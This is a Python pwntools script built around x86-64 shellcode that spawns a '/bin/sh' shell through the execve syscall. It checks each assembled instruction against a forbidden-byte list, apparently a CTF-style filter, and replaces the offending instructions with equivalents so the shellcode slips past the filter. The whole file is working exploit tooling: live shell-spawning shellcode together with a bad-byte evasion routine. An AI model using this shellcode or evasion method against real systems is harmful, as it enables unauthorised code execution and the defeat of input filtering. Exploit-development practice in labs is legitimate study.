from pwn import *

# ANSI color codes for terminal colorization
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'

# Define alternative suggestions for specific instructions as a list of potential replacements
alternative_instructions = {
    "xor rdx, rdx": ["mov rdx, 0", "sub rdx, rdx"],   # Single-line alternatives
    "xor rsi, rsi": ["mov rsi, 0", "sub rsi, rsi"],   # Single-line alternatives
    "mov rax, 0x3b": [                                # Multi-line alternative for setting rax to 0x3b
        [
            "push 0x3a",
            "pop rax",
            "add al, 0x1"
        ]
    ]
}

shellcode = [
    "mov rax, 0x68732f6e69622f",
    "push rax",
    "mov rdi, rsp",
    "xor rsi, rsi",
    "xor rdx, rdx",
    "mov rax, 0x3b",
    "syscall"
]

context.arch = 'x86_64'
forbidden_bytes = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
found_forbidden = False

new_shellcode = b""  # This will store the final "clean" shellcode without forbidden bytes
new_instructions = []  # This will store the readable instructions used to build the new shellcode

# Function to check if any forbidden bytes are present in byte sequence
def contains_forbidden_bytes(byte_sequence, forbidden_bytes):
    return any(byte in forbidden_bytes for byte in byte_sequence)

# Function to assemble a multi-line alternative instruction
def assemble_multiline_instruction(instructions):
    assembled_bytes = b""
    for instruction in instructions:
        assembled_bytes += asm(instruction)
    return assembled_bytes

# Highlight forbidden bytes in red within a string of bytes
def highlight_forbidden_bytes(byte_sequence, forbidden_bytes):
    highlighted_str = ""
    for byte in byte_sequence:
        if byte in forbidden_bytes:
            highlighted_str += f"{RED}{byte:02x}{RESET} "
        else:
            highlighted_str += f"{byte:02x} "
    return highlighted_str.strip()

# Iterate over each instruction in the shellcode
for instruction in shellcode:
    # Assemble the instruction into bytes
    instruction_bytes = asm(instruction)
    
    print(f"Instruction: {instruction}")
    
    # Highlight forbidden bytes in the byte sequence
    byte_str = highlight_forbidden_bytes(instruction_bytes, forbidden_bytes)
    
    # Print the assembled bytes with forbidden bytes highlighted
    print(f"Generated bytes: {byte_str}")
    
    # If forbidden bytes are found, loop through alternatives and suggest the first valid one
    if contains_forbidden_bytes(instruction_bytes, forbidden_bytes):
        if instruction in alternative_instructions:
            alternatives = alternative_instructions[instruction]
            alternative_found = False
            
            for alternative in alternatives:
                if isinstance(alternative, list):
                    # Handle multi-line alternative
                    alt_bytes = assemble_multiline_instruction(alternative)
                    if not contains_forbidden_bytes(alt_bytes, forbidden_bytes):
                        alt_byte_str = " ".join(f"{b:02x}" for b in alt_bytes)
                        print(f"Forbidden bytes found! Suggesting multi-line alternative:")
                        print(f"Alternative instructions:\n" + "\n".join(alternative))
                        print(f"Alternative instruction bytes: {alt_byte_str}")
                        new_shellcode += alt_bytes
                        new_instructions.extend([f"{GREEN}{inst}{RESET}" for inst in alternative])  # Highlight multi-line instructions in green
                        alternative_found = True
                        break
                else:
                    # Handle single-line alternative
                    alt_bytes = asm(alternative)
                    if not contains_forbidden_bytes(alt_bytes, forbidden_bytes):
                        alt_byte_str = " ".join(f"{b:02x}" for b in alt_bytes)
                        print(f"Forbidden bytes found! Suggesting alternative: {alternative}")
                        print(f"Alternative instruction bytes: {alt_byte_str}")
                        new_shellcode += alt_bytes
                        new_instructions.append(f"{GREEN}{alternative}{RESET}")  # Highlight single-line instruction in green
                        alternative_found = True
                        break
            
            if not alternative_found:
                print(f"No suitable alternative found for instruction: {instruction}")
                # Append the original instruction but highlight forbidden bytes in red
                new_shellcode += instruction_bytes
                highlighted_instruction = f"{instruction}  // bytes: {highlight_forbidden_bytes(instruction_bytes, forbidden_bytes)}"
                new_instructions.append(highlighted_instruction)
        else:
            print(f"Forbidden bytes found, but no alternative suggestion for instruction: {instruction}")
            # Append the original instruction but highlight forbidden bytes in red
            new_shellcode += instruction_bytes
            highlighted_instruction = f"{instruction}  // bytes: {highlight_forbidden_bytes(instruction_bytes, forbidden_bytes)}"
            new_instructions.append(highlighted_instruction)
    else:
        # If no forbidden bytes, add the original instruction bytes
        new_shellcode += instruction_bytes
        new_instructions.append(instruction)  # Append the original instruction if no replacement needed

    print()

# Output the new shellcode with forbidden bytes removed in both hex and assembly format
print(f"\nNew shellcode (hex): {new_shellcode.hex()}")
print("\nNew shellcode (raw instructions):")
print("\n".join(new_instructions))
